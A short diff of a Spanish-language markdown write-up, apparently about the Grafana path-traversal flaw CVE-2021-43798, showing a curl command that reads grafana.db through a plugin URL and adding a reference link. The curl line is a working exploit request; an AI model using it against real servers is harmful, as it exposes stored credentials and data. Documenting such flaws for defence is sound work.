@@ -23,3 +23,8 @@ de comandos con la herramienta curl, por ejemplo:
 
 ```
 curl --path-as-is "http://ip:3000/public/plugins/alertlist/../../../../../../../../../../../var/lib/grafana/grafana.db"
+```
+
+## Referencias
+
+1. https://github.com/MalekAlthubiany/CVE-2021-43798
